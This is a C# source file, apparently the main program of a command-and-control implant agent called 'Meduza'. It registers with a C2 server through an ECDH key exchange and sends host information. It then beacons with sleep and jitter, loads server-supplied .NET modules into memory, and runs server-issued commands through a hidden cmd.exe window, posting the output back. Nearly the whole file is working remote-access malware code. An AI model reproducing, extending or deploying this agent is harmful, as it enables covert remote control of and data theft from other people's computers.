using Agent.Models;
using Agent.Services;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO.Pipes;
using Agent.Models.C2Request;
using Meduza.Agent.ModuleBase;
using System.Text.Json;
using Agent.Core;
using System.Reflection;
using Meduza.Agent;
using Agent.Core.Utils.MessageTransformer;
using Agent.Core.Utils.Encoding;
using System.Runtime.Loader;
using System.Xml.Linq;
using System.Threading.Tasks;
using Agent.Core.Utils;
using System.Security.Cryptography;
using Agent.Core.Utils.Encryption;

// #if TYPE_http
AgentInformationService agentInformationService = new AgentInformationService();

// Decorator
var baseTransformer = new BaseTransformer();
var urlSafeBase64EncodingDecorator = new UrlSafeBase64EncodingDecorator(baseTransformer);
var urlSafeBase64DecodingDecorator = new UrlSafeBase64DecodingDecorator(baseTransformer);
var aesEncryptionDecorator = new AesEncryptionDecorator(baseTransformer);
var aesDecryptionDecorator = new AesDecryptionDecorator(baseTransformer);

// Queues, random and agentInfo 
var taskQueue = new ConcurrentQueue<AgentTask>();
var taskQueueLock = new object();
var messageQueue = new ConcurrentQueue<AgentTask>();
var messageQueueLock = new object();
var commandOutputQueue = new ConcurrentQueue<string>();
var rnd = new Random();
var agentInfo = await agentInformationService.GetAgentInfoAsync();

// Load the embedded config
var baseConfig = ConfigLoader.LoadEmbeddedConfig();

if (agentInfo is not null)
{
    baseConfig.AgentId = agentInfo.AgentId ?? string.Empty;
}

var baseCommunicationService = new CommunicationService(baseConfig);

var (privKey, pubKey) = ECDHUtils.GenerateECDHKeyPair();

var authRequest = new C2Request
{
    Reason = C2RequestReason.Authenticate,
    AgentId = baseConfig.AgentId,
    ConfigId = baseConfig.AgentConfigId,
    Message = Convert.ToBase64String(pubKey)
};

var authResponse = baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(authRequest));
Console.WriteLine(authResponse.Result);
var decodedAuthResponse = JsonSerializer.Deserialize<AuthenticationResponse>(authResponse.Result);

var peerPublicKey = Convert.FromBase64String(decodedAuthResponse.PublicKey);
byte[] sharedSecret = ECDHUtils.DeriveECDHSharedSecret(privKey, peerPublicKey);

baseCommunicationService.SetHeader("Session-Token", decodedAuthResponse.SessionToken);

// TEMP
string jsonOutput = JsonSerializer.Serialize(baseConfig);

// Write the JSON output to the console
Console.WriteLine(jsonOutput);
//

var delay = baseConfig.Sleep;
var jitter = baseConfig.Jitter;

// Contact request 
var registerRequest = new C2Request
{
    Reason = C2RequestReason.Register,
    AgentId = baseConfig.AgentId ?? string.Empty,
    ConfigId = baseConfig.AgentConfigId ?? string.Empty,
    AgentStatus = AgentStatus.Active,
    Message = JsonSerializer.Serialize(agentInfo)
};

var encryptedRegisterRequestMessage = aesEncryptionDecorator.Transform(JsonSerializer.Serialize(registerRequest), JsonSerializer.Serialize(sharedSecret));
Console.WriteLine("Secret: " + JsonSerializer.Serialize(sharedSecret));
Console.WriteLine(encryptedRegisterRequestMessage);

// Init contact request
var registrationResult = await baseCommunicationService.SimplePostAsync("/", encryptedRegisterRequestMessage);

if (registrationResult is null)
{
    Console.WriteLine("Failed to register with the C2 server.");
    Environment.Exit(1);
}
// Main loop
while (true)
{
    try
    {
        using (var client = new HttpClient())
        {
            if (baseCommunicationService.BaseConfig is null)
            {
                Console.WriteLine("BaseConfig is null.");
                Environment.Exit(1);
            }

            int realJitter = delay * (jitter / 100);
            if (rnd.Next(2) == 0) { realJitter = -realJitter; }
            Thread.Sleep((delay + realJitter) * 1000);

            var taskRequest = new C2Request { Reason = C2RequestReason.Task, AgentId = baseCommunicationService.BaseConfig.AgentId, AgentStatus = AgentStatus.Active };
            var result = await baseCommunicationService.SimplePostAsync($"/", JsonSerializer.Serialize(taskRequest));

            if (!string.IsNullOrWhiteSpace(result))
            {
                var taskResponse = JsonSerializer.Deserialize<C2Request>(result);
                if (taskResponse is null) continue;
                //var decryptedResult = xorDecryptionBase64DecodingDecorator.Transform(taskResponse.Message);
                var tasks = JsonSerializer.Deserialize<List<AgentTask>>(taskResponse.Message);
                if (tasks is null || tasks.Count == 0) continue;


                foreach (var task in tasks)
                {
                    if (task is null) continue;

                    if (task.TaskCompleted > DateTime.MinValue) continue;

                    //Console.WriteLine(JsonSerializer.Serialize(task));

                    if (!string.IsNullOrWhiteSpace(task.Module) && task.Status is not AgentTaskStatus.Running)
                    {
                        task.QueueRunningStatus(messageQueue, messageQueueLock);

                        try
                        {
                            // Decode the base64 module bytes
                            var moduleBytes = JsonSerializer.Deserialize<ModuleBytesModel>(
                                System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(task.Module))
                            );

                            if (moduleBytes == null)
                            {
                                Console.WriteLine("Failed to deserialize module bytes.");
                                continue;
                            }

                            var loadContext = new ModuleLoadContext(
                                moduleBytes.ModuleBytes,
                                moduleBytes.DependencyBytes ?? new Dictionary<string, byte[]>());

                            Assembly assembly = loadContext.LoadMainModule();

                            // Load the module and its commands
                            var module = ModuleLoader.LoadModule(assembly);

                            foreach (var moduleCommand in module.Commands)
                            {
                                try
                                {
                                    task.Command.Output = ExecuteCommand(
                                        moduleCommand,
                                        task.Command.Parameters,
                                        task.IsCancellationTokenSourceSet
                                    );
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine($"Command execution error: {ex.Message}");
                                    while (commandOutputQueue.TryDequeue(out var commandOutputResult))
                                    {
                                        task.Command.Output += commandOutputResult;
                                    }
                                }
                            }

                            task.Module = string.Empty;
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Module loading error: {ex.Message}");
                            task.Command.Output = $"Error loading module: {ex.Message}";
                        }
                    }

                    lock (taskQueueLock)
                    {
                        if (task is not null)
                            taskQueue.Enqueue(task);
                    }

                    if (task!.Status is not AgentTaskStatus.Running)
                        task!.QueueQueuedStatus(messageQueue, messageQueueLock);
                }

                await HandleQueuedTasks();

                // Flush message queue for now
                List<AgentTask?> agentTasks = [];
                lock (messageQueueLock)
                {
                    while (messageQueue.TryDequeue(out var queueData))
                    {
                        if (queueData is not null)
                            agentTasks.Add(queueData);
                    }
                }

                foreach (var agentTask in agentTasks)
                {
                    var taskUpdateRequest = new C2Request
                    {
                        AgentId = baseCommunicationService.BaseConfig.AgentId,
                        AgentStatus = AgentStatus.Active,
                        Reason = C2RequestReason.Response,
                        Message = JsonSerializer.Serialize(agentTask)
                    };

                    await baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(taskUpdateRequest));
                }
            }
            else
            {
                Console.WriteLine($"[{DateTime.UtcNow}]:\tDid not connect to server");
            }
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"Agent initialization failed: {ex.Message}");
    }
}

async Task HandleQueuedTasks()
{
    while (taskQueue.TryDequeue(out var task))
        await HandleTask(task);
}

async Task HandleTask(AgentTask task)
{
    task.QueueRunningStatus(messageQueue, messageQueueLock);

    switch (task.Type)
    {
        // When the SetDelay TaskType is set, the 2nd param always needs a value
        // -1 will set Delay only and skip changing jitter
        case AgentTaskType.SetDelay:
            delay = Convert.ToInt32(task.Command.Parameters[1]);
            var jitterParam = Convert.ToInt32(task.Command.Parameters[2]);
            jitter = jitterParam != -1 ? jitterParam : jitter;
            break;
        case AgentTaskType.SetJitter:
            jitter = Convert.ToInt32(task.Command.Parameters[1]);
            break;
        case AgentTaskType.ShellCommand:
            await Task.Run(async () =>
            {
                task.Command.CommandStarted = DateTime.UtcNow;
                task.Command.Output = await ExecuteShellCommand(task.Command.Parameters);
                task.Command.CommandCompleted = DateTime.UtcNow;
            });
            break;
        case AgentTaskType.Exit:
            break;
    }

    task.QueueCompletedStatus(messageQueue, messageQueueLock);
}

// Command execution logic
// TODO redo logic to use cancellationtoken rather than tokensource

string ExecuteCommand(ICommand command, string[]? parameters, bool IsCancellationTokenSourceSet)
{
    const int delay = 1;
    const int MAX_MESSAGE_SIZE = 1048576;
    var output = string.Empty;
    var results = string.Empty;
    var invokeThread = new Thread(() => results = command.Execute(parameters));
    using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
    {
        using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
        {
            command.OutputStream = pipeClient;
            var lastTime = DateTime.Now;
            invokeThread.Start();
            using (StreamReader reader = new StreamReader(pipeServer))
            {
                var synclock = new object();
                var currentRead = string.Empty;
                var readThread = new Thread(() =>
                {
                    int count;
                    var read = new char[MAX_MESSAGE_SIZE];
                    while ((count = reader.Read(read, 0, read.Length)) > 0)
                    {
                        lock (synclock)
                        {
                            currentRead += new string(read, 0, count);
                        }
                    }
                });
                readThread.Start();
                while (readThread.IsAlive)
                {
                    Thread.Sleep(delay * 1000);
                    lock (synclock)
                    {
                        try
                        {
                            if (currentRead.Length >= MAX_MESSAGE_SIZE)
                            {
                                for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
                                {
                                    string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
                                    try
                                    {
                                        commandOutputQueue.Enqueue(aRead);
                                    }
                                    catch (Exception) { }
                                }
                                currentRead = string.Empty;
                                lastTime = DateTime.Now;
                            }
                            else if (currentRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(delay))))
                            {
                                commandOutputQueue.Enqueue(currentRead);
                                currentRead = string.Empty;
                                lastTime = DateTime.Now;
                            }
                        }
                        catch (ThreadAbortException) { break; }
                        catch (Exception) { currentRead = string.Empty; }
                    }
                }
                while (commandOutputQueue.TryDequeue(out var commandOutputResult))
                {
                    output += commandOutputResult;
                }
            }
        }
        invokeThread.Join();
    }
    output += results;

    return output;
}

async Task<string> ExecuteShellCommand(string[] commandParameters, bool IsCancellationTokenSourceSet = false)
{
    ArgumentNullException.ThrowIfNull(commandParameters, nameof(commandParameters));

    var command = string.Join(" ", commandParameters);
    var output = string.Empty;

    try
    {
        await Task.Run(() =>
        {
            Console.WriteLine(command);
            Console.WriteLine(AppContext.BaseDirectory);

            var processStartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = command,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                UseShellExecute = false,
                WorkingDirectory = AppContext.BaseDirectory
            };

            var process = new Process { StartInfo = processStartInfo };

            Console.WriteLine($"{processStartInfo.FileName} {processStartInfo.Arguments}");

            process.Start();
            output = process.StandardOutput.ReadToEnd(); // Capture the output
            string errorOutput = process.StandardError.ReadToEnd(); // Capture error output
            process.WaitForExit();

            if (!string.IsNullOrEmpty(errorOutput))
            {
                Console.WriteLine("Error Output:");
                Console.WriteLine(errorOutput);
                output = errorOutput;
            }
        });
    }
    catch (Exception ex)
    {
        Console.WriteLine($"Failed to run command: {command}\n\t{ex.Message}");
        throw;
    }

    return output;
}
// #elif TYPE_tcp

// #else

// #endif
